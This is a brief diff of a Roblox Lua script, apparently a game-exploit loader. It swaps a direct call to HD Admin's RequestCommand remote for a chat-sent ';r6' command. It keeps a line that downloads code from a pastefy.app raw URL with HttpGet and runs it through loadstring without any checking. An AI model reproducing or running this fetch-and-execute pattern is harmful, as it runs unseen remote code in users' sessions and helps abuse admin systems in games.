@@ -1,3 +1,9 @@
-local args = { 	";r6" } game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
+local TextChatService = game:GetService("TextChatService")
+
+task.wait(0.5)
+local channel = TextChatService.TextChannels.RBXGeneral
+if channel then
+	channel:SendAsync(";r6")
+end
 
 loadstring(game:HttpGet("https://pastefy.app/aGPGIrjN/raw"))()
